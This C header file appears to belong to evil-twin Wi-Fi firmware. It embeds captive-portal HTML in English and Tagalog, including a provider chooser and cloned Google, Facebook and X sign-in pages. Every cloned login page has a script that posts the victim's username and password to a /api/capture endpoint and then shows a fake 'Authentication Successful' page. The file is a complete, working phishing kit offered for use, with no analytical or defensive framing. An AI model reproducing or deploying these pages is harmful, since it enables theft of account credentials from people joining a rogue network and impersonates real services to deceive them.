#ifndef EVIL_TWIN_PORTAL_HTML_H
#define EVIL_TWIN_PORTAL_HTML_H

// ---- Common CSS and JS ----
const char html_portal_common_css[] PROGMEM = R"rawliteral(
<style>
body{font-family:sans-serif;background:#f4f4f4;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
.c{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}
.btn{color:#fff;border:none;padding:12px;width:100%;border-radius:4px;font-size:16px;cursor:pointer;margin-top:10px;text-decoration:none;display:block;box-sizing:border-box;}
.btn-google{background:#4285F4;color:#fff;}
.btn-facebook{background:#1877F2;color:#fff;}
.btn-twitter{background:#000;color:#fff;}
.input-f{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;}
.sub-text{font-size:12px;color:#777;margin-top:20px;}
.logo{max-height:40px;margin-bottom:20px;}
.sp{margin:15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;animation:s 1s linear infinite;display:none}
@keyframes s{to{transform:rotate(360deg)}}
</style>
)rawliteral";

const char html_portal_common_js[] PROGMEM = R"rawliteral(
<script>
function sendCreds(provider){
  var u=document.getElementById('usr').value;
  var p=document.getElementById('pwd').value;
  if(!u || !p){ alert('Please enter your credentials'); return false; }
  document.getElementById('f').style.display='none';
  document.getElementById('sp').style.display='block';
  var x=new XMLHttpRequest();
  x.open('POST','/api/capture',true);
  x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  x.send('provider='+encodeURIComponent(provider)+'&username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));
  setTimeout(function(){ window.location.href='/success'; }, 2000);
  return false;
}
</script>
)rawliteral";

// ---- Provider Selection ----
const char html_provider_selection_en[] PROGMEM =
    R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in to Network</title>
)rawliteral"
    "<style>body{font-family:sans-serif;background:#f4f4f4;margin:0;display:"
    "flex;align-items:center;justify-content:center;height:100vh}.c{background:"
    "#fff;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}.btn{background:#fff;color:#"
    "333;border:1px solid #ccc;padding:14px;width:100%;border-radius:500px;font-size:16px;"
    "font-weight:700;cursor:pointer;margin-top:12px;text-decoration:none;display:flex;align-items:center;justify-content:center;position:relative;box-"
    "sizing:border-box;}.btn:hover{background:#f9f9f9;border-color:#aaa;}.btn::before{content:'';position:absolute;left:20px;width:24px;height:24px;background-size:contain;background-repeat:no-repeat;background-position:center center}"
    ".btn-google::before{background-image:url('data:image/svg+xml;utf8,<svg viewBox=\"0 0 48 48\" xmlns=\"http://www.w3.org/2000/svg\"><path fill=\"%234285F4\" d=\"M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z\"/><path fill=\"%2334A853\" d=\"M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z\"/><path fill=\"%23FBBC05\" d=\"M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z\"/><path fill=\"%23EA4335\" d=\"M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z\"/></svg>');}"
    ".btn-facebook::before{background-image:url('data:image/svg+xml;utf8,<svg viewBox=\"0 0 24 24\" xmlns=\"http://www.w3.org/2000/svg\"><path fill=\"%231877F2\" d=\"M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z\"/></svg>');}"
    ".btn-twitter::before{background-image:url('data:image/svg+xml;utf8,<svg viewBox=\"0 0 24 24\" xmlns=\"http://www.w3.org/2000/svg\"><path fill=\"%23000\" d=\"M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z\"/></svg>');}"
    ".btn.loading{color:transparent;}.btn.loading::after{content:'';position:absolute;left:50%;top:50%;width:18px;height:18px;margin:-11px 0 0 -11px;border:3px solid #ccc;border-top-color:#333;border-radius:50%;animation:spin 1s linear infinite;}@keyframes spin{to{transform:rotate(360deg);}}"
    ".sub-text{font-size:12px;color:#777;margin-top:30px;}h2{color:#333;font-size:24px;margin-bottom:20px;}</style>"
    R"rawliteral(
</head><body><div class="c">
<h2>Log in to Network</h2>
%GOOGLE_BTN%
%FACEBOOK_BTN%
%TWITTER_BTN%
<div class="sub-text">By logging in, you agree to network terms</div>
</div><script>window.onload=function(){var b=document.querySelectorAll('.btn');for(var i=0;i<b.length;i++){b[i].onclick=function(e){e.preventDefault();this.classList.add('loading');var h=this.href;setTimeout(function(){window.location.href=h;},600);};}};</script></body></html>
)rawliteral";

const char html_provider_selection_tl[] PROGMEM =
    R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Mag-log in sa Network</title>
)rawliteral"
    "<style>body{font-family:sans-serif;background:#f4f4f4;margin:0;display:"
    "flex;align-items:center;justify-content:center;height:100vh}.c{background:"
    "#fff;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}.btn{background:#fff;color:#"
    "333;border:1px solid #ccc;padding:14px;width:100%;border-radius:500px;font-size:16px;"
    "font-weight:700;cursor:pointer;margin-top:12px;text-decoration:none;display:flex;align-items:center;justify-content:center;position:relative;box-"
    "sizing:border-box;}.btn:hover{background:#f9f9f9;border-color:#aaa;}.btn::before{content:'';position:absolute;left:20px;width:24px;height:24px;background-size:contain;background-repeat:no-repeat;background-position:center center}"
    ".btn-google::before{background-image:url('data:image/svg+xml;utf8,<svg viewBox=\"0 0 48 48\" xmlns=\"http://www.w3.org/2000/svg\"><path fill=\"%234285F4\" d=\"M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z\"/><path fill=\"%2334A853\" d=\"M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z\"/><path fill=\"%23FBBC05\" d=\"M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z\"/><path fill=\"%23EA4335\" d=\"M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z\"/></svg>');}"
    ".btn-facebook::before{background-image:url('data:image/svg+xml;utf8,<svg viewBox=\"0 0 24 24\" xmlns=\"http://www.w3.org/2000/svg\"><path fill=\"%231877F2\" d=\"M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z\"/></svg>');}"
    ".btn-twitter::before{background-image:url('data:image/svg+xml;utf8,<svg viewBox=\"0 0 24 24\" xmlns=\"http://www.w3.org/2000/svg\"><path fill=\"%23000\" d=\"M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z\"/></svg>');}"
    ".btn.loading{color:transparent;}.btn.loading::after{content:'';position:absolute;left:50%;top:50%;width:18px;height:18px;margin:-11px 0 0 -11px;border:3px solid #ccc;border-top-color:#333;border-radius:50%;animation:spin 1s linear infinite;}@keyframes spin{to{transform:rotate(360deg);}}"
    ".sub-text{font-size:12px;color:#777;margin-top:30px;}h2{color:#333;font-size:24px;margin-bottom:20px;}</style>"
    R"rawliteral(
</head><body><div class="c">
<h2>Mag-log in sa Network</h2>
%GOOGLE_BTN%
%FACEBOOK_BTN%
%TWITTER_BTN%
<div class="sub-text">Sa pag-log in, sumusunod ka sa aming mga kondisyon</div>
</div><script>window.onload=function(){var b=document.querySelectorAll('.btn');for(var i=0;i<b.length;i++){b[i].onclick=function(e){e.preventDefault();this.classList.add('loading');var h=this.href;setTimeout(function(){window.location.href=h;},600);};}};</script></body></html>
)rawliteral";

// ---- Google Login ----
const char html_google_login_en[] PROGMEM =
    R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sign in - Google Accounts</title>
)rawliteral"
    "<style>body{font-family:sans-serif;background:#fff;margin:0;display:flex;"
    "align-items:center;justify-content:center;height:100vh}.c{border:1px "
    "solid "
    "#dadce0;padding:40px;border-radius:8px;width:90%;max-width:400px;text-"
    "align:center}.btn{background:#1a73e8;color:#fff;border:none;padding:10px "
    "24px;border-radius:4px;font-weight:500;cursor:pointer;float:right;margin-"
    "top:20px}.input-f{width:100%;padding:13px 15px;margin:10px 0;border:1px "
    "solid "
    "#dadce0;border-radius:4px;box-sizing:border-box;font-size:16px}.logo{font-"
    "size:24px;font-weight:bold;color:#4285F4;margin-bottom:10px}.sp{margin:"
    "15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px "
    "solid #1a73e8;border-radius:50%;animation:s 1s linear "
    "infinite;display:none}@keyframes s{to{transform:rotate(360deg)}}</style>"
    R"rawliteral(
</head><body><div class="c">
<div class="logo"><svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg></div>
<h2 style="font-weight:400;margin-bottom:5px">Sign in</h2>
<p style="margin-top:0">to continue to Network</p>
<form id="f" onsubmit="return sendCreds('google')">
<input type="text" id="usr" class="input-f" placeholder="Email or phone" required>
<input type="password" id="pwd" class="input-f" placeholder="Enter your password" required>
<div style="text-align:left;margin-top:10px"><a href="#" style="color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500">Forgot password?</a></div>
<div style="overflow:auto"><button type="submit" class="btn">Next</button></div>
</form>
<div id="sp" class="sp"></div>
</div>
)rawliteral"
    "<script>function sendCreds(provider){var "
    "u=document.getElementById('usr').value;var "
    "p=document.getElementById('pwd').value;if(!u||!p){return "
    "false;}document.getElementById('f').style.display='none';document."
    "getElementById('sp').style.display='block';var x=new "
    "XMLHttpRequest();x.open('POST','/api/"
    "capture',true);x.setRequestHeader('Content-Type','application/"
    "x-www-form-urlencoded');x.send('provider='+encodeURIComponent(provider)+'&"
    "username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));"
    "setTimeout(function(){window.location.href='/success';},2000);return "
    "false;}</script>"
    R"rawliteral(
</body></html>
)rawliteral";

const char html_google_login_tl[] PROGMEM =
    R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sign in - Google Accounts</title>
)rawliteral"
    "<style>body{font-family:sans-serif;background:#fff;margin:0;display:flex;"
    "align-items:center;justify-content:center;height:100vh}.c{border:1px "
    "solid "
    "#dadce0;padding:40px;border-radius:8px;width:90%;max-width:400px;text-"
    "align:center}.btn{background:#1a73e8;color:#fff;border:none;padding:10px "
    "24px;border-radius:4px;font-weight:500;cursor:pointer;float:right;margin-"
    "top:20px}.input-f{width:100%;padding:13px 15px;margin:10px 0;border:1px "
    "solid "
    "#dadce0;border-radius:4px;box-sizing:border-box;font-size:16px}.logo{font-"
    "size:24px;font-weight:bold;color:#4285F4;margin-bottom:10px}.sp{margin:"
    "15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px "
    "solid #1a73e8;border-radius:50%;animation:s 1s linear "
    "infinite;display:none}@keyframes s{to{transform:rotate(360deg)}}</style>"
    R"rawliteral(
</head><body><div class="c">
<div class="logo"><svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg></div>
<h2 style="font-weight:400;margin-bottom:5px">Mag-sign in</h2>
<p style="margin-top:0">upang magpatuloy sa Network</p>
<form id="f" onsubmit="return sendCreds('google')">
<input type="text" id="usr" class="input-f" placeholder="Email o telepono" required>
<input type="password" id="pwd" class="input-f" placeholder="Ilagay ang iyong password" required>
<div style="text-align:left;margin-top:10px"><a href="#" style="color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500">Nakalimutan ang password?</a></div>
<div style="overflow:auto"><button type="submit" class="btn">Susunod</button></div>
</form>
<div id="sp" class="sp"></div>
</div>
)rawliteral"
    "<script>function sendCreds(provider){var "
    "u=document.getElementById('usr').value;var "
    "p=document.getElementById('pwd').value;if(!u||!p){return "
    "false;}document.getElementById('f').style.display='none';document."
    "getElementById('sp').style.display='block';var x=new "
    "XMLHttpRequest();x.open('POST','/api/"
    "capture',true);x.setRequestHeader('Content-Type','application/"
    "x-www-form-urlencoded');x.send('provider='+encodeURIComponent(provider)+'&"
    "username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));"
    "setTimeout(function(){window.location.href='/success';},2000);return "
    "false;}</script>"
    R"rawliteral(
</body></html>
)rawliteral";

// ---- Facebook Login ----
const char html_facebook_login_en[] PROGMEM =
    R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook - Log In or Sign Up</title>
)rawliteral"
    "<style>body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;"
    "margin:0;display:flex;align-items:center;justify-content:center;height:"
    "100vh}.c{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px "
    "4px "
    "rgba(0,0,0,.1);width:90%;max-width:396px;text-align:center}.btn{"
    "background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;"
    "font-size:20px;font-weight:bold;cursor:pointer;width:100%;margin-top:15px}"
    ".input-f{width:100%;padding:14px 16px;margin:6px 0;border:1px solid "
    "#dddfe2;border-radius:6px;box-sizing:border-box;font-size:17px}.logo{"
    "color:#1877f2;font-size:36px;font-weight:bold;margin-bottom:20px}.sp{"
    "margin:15px auto;width:30px;height:30px;border:4px solid "
    "#f3f3f3;border-top:4px solid #1877f2;border-radius:50%;animation:s 1s "
    "linear infinite;display:none}@keyframes "
    "s{to{transform:rotate(360deg)}}</style>"
    R"rawliteral(
</head><body>
<div style="width:100%;text-align:center;position:absolute;top:10%;left:0"><div class="logo">facebook</div></div>
<div class="c">
<form id="f" onsubmit="return sendCreds('facebook')">
<input type="text" id="usr" class="input-f" placeholder="Email or phone number" required>
<input type="password" id="pwd" class="input-f" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
<div style="margin-top:15px"><a href="#" style="color:#1877f2;text-decoration:none;font-size:14px">Forgot password?</a></div>
<hr style="border:0;border-top:1px solid #dadde1;margin:20px 0">
<a href="#" style="background:#42b72a;color:#fff;padding:12px 16px;border-radius:6px;text-decoration:none;font-weight:bold;font-size:17px;display:inline-block">Create New Account</a>
</form>
<div id="sp" class="sp"></div>
</div>
)rawliteral"
    "<script>function sendCreds(provider){var "
    "u=document.getElementById('usr').value;var "
    "p=document.getElementById('pwd').value;if(!u||!p){return "
    "false;}document.getElementById('f').style.display='none';document."
    "getElementById('sp').style.display='block';var x=new "
    "XMLHttpRequest();x.open('POST','/api/"
    "capture',true);x.setRequestHeader('Content-Type','application/"
    "x-www-form-urlencoded');x.send('provider='+encodeURIComponent(provider)+'&"
    "username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));"
    "setTimeout(function(){window.location.href='/success';},2000);return "
    "false;}</script>"
    R"rawliteral(
</body></html>
)rawliteral";

const char html_facebook_login_tl[] PROGMEM =
    R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook - Mag-log In</title>
)rawliteral"
    "<style>body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;"
    "margin:0;display:flex;align-items:center;justify-content:center;height:"
    "100vh}.c{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px "
    "4px "
    "rgba(0,0,0,.1);width:90%;max-width:396px;text-align:center}.btn{"
    "background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;"
    "font-size:20px;font-weight:bold;cursor:pointer;width:100%;margin-top:15px}"
    ".input-f{width:100%;padding:14px 16px;margin:6px 0;border:1px solid "
    "#dddfe2;border-radius:6px;box-sizing:border-box;font-size:17px}.logo{"
    "color:#1877f2;font-size:36px;font-weight:bold;margin-bottom:20px}.sp{"
    "margin:15px auto;width:30px;height:30px;border:4px solid "
    "#f3f3f3;border-top:4px solid #1877f2;border-radius:50%;animation:s 1s "
    "linear infinite;display:none}@keyframes "
    "s{to{transform:rotate(360deg)}}</style>"
    R"rawliteral(
</head><body>
<div style="width:100%;text-align:center;position:absolute;top:10%;left:0"><div class="logo">facebook</div></div>
<div class="c">
<form id="f" onsubmit="return sendCreds('facebook')">
<input type="text" id="usr" class="input-f" placeholder="Email o mobile number" required>
<input type="password" id="pwd" class="input-f" placeholder="Password" required>
<button type="submit" class="btn">Mag-log In</button>
<div style="margin-top:15px"><a href="#" style="color:#1877f2;text-decoration:none;font-size:14px">Nakalimutan ang password?</a></div>
<hr style="border:0;border-top:1px solid #dadde1;margin:20px 0">
<a href="#" style="background:#42b72a;color:#fff;padding:12px 16px;border-radius:6px;text-decoration:none;font-weight:bold;font-size:17px;display:inline-block">Gumawa ng Bagong Account</a>
</form>
<div id="sp" class="sp"></div>
</div>
)rawliteral"
    "<script>function sendCreds(provider){var "
    "u=document.getElementById('usr').value;var "
    "p=document.getElementById('pwd').value;if(!u||!p){return "
    "false;}document.getElementById('f').style.display='none';document."
    "getElementById('sp').style.display='block';var x=new "
    "XMLHttpRequest();x.open('POST','/api/"
    "capture',true);x.setRequestHeader('Content-Type','application/"
    "x-www-form-urlencoded');x.send('provider='+encodeURIComponent(provider)+'&"
    "username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));"
    "setTimeout(function(){window.location.href='/success';},2000);return "
    "false;}</script>"
    R"rawliteral(
</body></html>
)rawliteral";

// ---- Twitter / X Login ----
const char html_twitter_login_en[] PROGMEM =
    R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in to X</title>
)rawliteral"
    "<style>body{font-family:sans-serif;background:#000;color:#e7e9ea;margin:0;"
    "display:flex;align-items:center;justify-content:center;height:100vh}.c{"
    "background:#000;padding:20px;width:90%;max-width:380px;text-align:center;"
    "box-sizing:border-box}.btn{background:#eff3f4;color:#0f1419;border:none;"
    "padding:12px;border-radius:24px;font-size:17px;font-weight:bold;cursor:"
    "pointer;width:100%;margin-top:20px}.input-f{width:100%;padding:16px 8px "
    "8px 8px;margin:12px 0;border:1px solid "
    "#333639;background:#000;color:#e7e9ea;border-radius:4px;box-sizing:border-"
    "box;font-size:17px}.logo{font-size:30px;font-weight:bold;color:#e7e9ea;"
    "margin-bottom:30px}.sp{margin:15px auto;width:30px;height:30px;border:4px "
    "solid #333;border-top:4px solid #eff3f4;border-radius:50%;animation:s 1s "
    "linear infinite;display:none}@keyframes "
    "s{to{transform:rotate(360deg)}}</style>"
    R"rawliteral(
</head><body><div class="c">
<div class="logo">𝕏</div>
<h2 style="text-align:left;font-size:31px;margin-bottom:20px">Sign in to X</h2>
<form id="f" onsubmit="return sendCreds('twitter')">
<input type="text" id="usr" class="input-f" placeholder="Phone, email, or username" required>
<input type="password" id="pwd" class="input-f" placeholder="Password" required>
<button type="submit" class="btn">Log in</button>
<button type="button" class="btn" style="background:#000;color:#eff3f4;border:1px solid #536471;margin-top:15px">Forgot password?</button>
</form>
<div id="sp" class="sp"></div>
</div>
)rawliteral"
    "<script>function sendCreds(provider){var "
    "u=document.getElementById('usr').value;var "
    "p=document.getElementById('pwd').value;if(!u||!p){return "
    "false;}document.getElementById('f').style.display='none';document."
    "getElementById('sp').style.display='block';var x=new "
    "XMLHttpRequest();x.open('POST','/api/"
    "capture',true);x.setRequestHeader('Content-Type','application/"
    "x-www-form-urlencoded');x.send('provider='+encodeURIComponent(provider)+'&"
    "username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));"
    "setTimeout(function(){window.location.href='/success';},2000);return "
    "false;}</script>"
    R"rawliteral(
</body></html>
)rawliteral";

const char html_twitter_login_tl[] PROGMEM =
    R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in sa X</title>
)rawliteral"
    "<style>body{font-family:sans-serif;background:#000;color:#e7e9ea;margin:0;"
    "display:flex;align-items:center;justify-content:center;height:100vh}.c{"
    "background:#000;padding:20px;width:90%;max-width:380px;text-align:center;"
    "box-sizing:border-box}.btn{background:#eff3f4;color:#0f1419;border:none;"
    "padding:12px;border-radius:24px;font-size:17px;font-weight:bold;cursor:"
    "pointer;width:100%;margin-top:20px}.input-f{width:100%;padding:16px 8px "
    "8px 8px;margin:12px 0;border:1px solid "
    "#333639;background:#000;color:#e7e9ea;border-radius:4px;box-sizing:border-"
    "box;font-size:17px}.logo{font-size:30px;font-weight:bold;color:#e7e9ea;"
    "margin-bottom:30px}.sp{margin:15px auto;width:30px;height:30px;border:4px "
    "solid #333;border-top:4px solid #eff3f4;border-radius:50%;animation:s 1s "
    "linear infinite;display:none}@keyframes "
    "s{to{transform:rotate(360deg)}}</style>"
    R"rawliteral(
</head><body><div class="c">
<div class="logo">𝕏</div>
<h2 style="text-align:left;font-size:31px;margin-bottom:20px">Mag-sign in sa X</h2>
<form id="f" onsubmit="return sendCreds('twitter')">
<input type="text" id="usr" class="input-f" placeholder="Telepono, email, o username" required>
<input type="password" id="pwd" class="input-f" placeholder="Password" required>
<button type="submit" class="btn">Log in</button>
<button type="button" class="btn" style="background:#000;color:#eff3f4;border:1px solid #536471;margin-top:15px">Nakalimutan ang password?</button>
</form>
<div id="sp" class="sp"></div>
</div>
)rawliteral"
    "<script>function sendCreds(provider){var "
    "u=document.getElementById('usr').value;var "
    "p=document.getElementById('pwd').value;if(!u||!p){return "
    "false;}document.getElementById('f').style.display='none';document."
    "getElementById('sp').style.display='block';var x=new "
    "XMLHttpRequest();x.open('POST','/api/"
    "capture',true);x.setRequestHeader('Content-Type','application/"
    "x-www-form-urlencoded');x.send('provider='+encodeURIComponent(provider)+'&"
    "username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));"
    "setTimeout(function(){window.location.href='/success';},2000);return "
    "false;}</script>"
    R"rawliteral(
</body></html>
)rawliteral";

// ---- Fake Success ----
const char html_fake_success_en[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Authentication Successful</title>
<style>body{font-family:sans-serif;background:#f4f4f4;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}.c{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}.sp{margin:15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px solid #28a745;border-radius:50%;animation:s 1s linear infinite}@keyframes s{to{transform:rotate(360deg)}}</style>
</head><body><div class="c">
<h2 style="color:#28a745">Authentication Successful</h2>
<p>Your credentials are being verified...</p>
<div class="sp"></div>
<p style="font-size:12px;color:#777">You will be redirected shortly.</p>
</div></body></html>
)rawliteral";

const char html_fake_success_tl[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Authentication Successful</title>
<style>body{font-family:sans-serif;background:#f4f4f4;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}.c{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}.sp{margin:15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px solid #28a745;border-radius:50%;animation:s 1s linear infinite}@keyframes s{to{transform:rotate(360deg)}}</style>
</head><body><div class="c">
<h2 style="color:#28a745">Matagumpay na Authentication</h2>
<p>Kasalukuyang sinusuri ang iyong impormasyon...</p>
<div class="sp"></div>
<p style="font-size:12px;color:#777">Ikaw ay ire-redirect na...</p>
</div></body></html>
)rawliteral";

#endif
